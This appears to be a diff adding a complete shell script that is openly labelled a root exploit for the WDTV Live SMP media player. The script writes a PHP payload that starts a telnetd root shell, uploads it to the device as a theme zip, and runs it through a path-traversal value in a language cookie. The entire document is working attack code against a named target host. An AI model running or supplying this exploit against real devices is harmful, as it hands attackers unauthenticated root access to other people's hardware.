@@ -1,0 +1,29 @@
+#!/bin/sh
+THEME_NAME="blub"
+
+if [ $# != 1 ]; then
+  TARGET="orpheus"
+  echo "Root Exploit for WDTV Live SMP\n\nUsing default 
+target=${TARGET}\nUSAGE: $0 <target>\n\n"
+else
+  TARGET=$1
+fi
+
+if [ ! -f "home.php" ]; then
+  echo '<?php system("telnetd -l /bin/sh");print "\nUnd es hat blub 
+gemacht.\n\n";exit();' > home.php
+fi
+
+if [ ! -f "${THEME_NAME}.zip" ]; then
+  touch meta.xml
+  zip ${THEME_NAME} home.php meta.xml
+fi
+
+echo "Uploading ${THEME_NAME}.zip:"
+curl -F appearance=@${THEME_NAME}.zip -o /dev/null \
+  http://${TARGET}/upload.php
+
+echo "\n\nRunning payload:"
+curl --cookie "language=../../../../usrdata/.wd_tv/theme/${THEME_NAME}" \
+  http://${TARGET}/index.php
+
